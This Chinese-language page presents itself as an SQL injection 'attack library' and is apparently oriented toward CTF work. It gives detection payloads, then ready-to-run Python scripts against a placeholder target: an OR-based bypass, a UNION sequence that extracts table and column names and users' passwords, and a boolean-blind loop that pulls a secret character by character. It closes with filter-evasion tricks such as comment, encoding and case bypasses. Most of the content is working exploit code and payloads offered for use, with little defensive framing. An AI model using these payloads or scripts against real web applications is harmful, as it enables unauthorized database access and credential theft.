# SQL注入攻击库

## 漏洞描述

SQL注入是一种常见的Web应用安全漏洞，攻击者通过在用户输入中插入恶意SQL代码，来操纵数据库查询。

## 检测方法

1. **基础检测**：在参数中添加单引号 `'`，观察是否报错
2. **布尔盲注**：使用 `1' AND '1'='1` 和 `1' AND '1'='2` 对比响应
3. **时间盲注**：使用 `1' AND SLEEP(5)--` 观察响应延迟
4. **联合查询**：尝试 `1' UNION SELECT 1,2,3--`

## 利用示例

### 案例1: 基础SQL注入

```python
import requests

url = "http://target.com/page?id=1"
payload = "1' OR '1'='1"
response = requests.get(url, params={"id": payload})
print(response.text)
```

### 案例2: 联合查询注入

```python
# 确定列数
payload = "1' UNION SELECT 1,2,3--"

# 获取数据库名
payload = "1' UNION SELECT 1,database(),3--"

# 获取表名
payload = "1' UNION SELECT 1,table_name,3 FROM information_schema.tables--"

# 获取列名
payload = "1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"

# 获取数据
payload = "1' UNION SELECT 1,username,password FROM users--"
```

### 案例3: 布尔盲注

```python
import requests
import string

url = "http://target.com/page"
flag = ""

for i in range(1, 50):
    for char in string.ascii_letters + string.digits + "{}":
        payload = f"1' AND SUBSTRING((SELECT flag FROM flags LIMIT 1), {i}, 1)='{char}'--"
        response = requests.get(url, params={"id": payload})
        if "success" in response.text:
            flag += char
            print(f"Found: {flag}")
            break
```

## 绕过技巧

1. **注释符**：`--`, `#`, `/**/`
2. **编码绕过**：URL编码、十六进制编码
3. **大小写绕过**：`UnIoN SeLeCt`
4. **空格绕过**：使用 `/**/` 或 `+` 替代空格

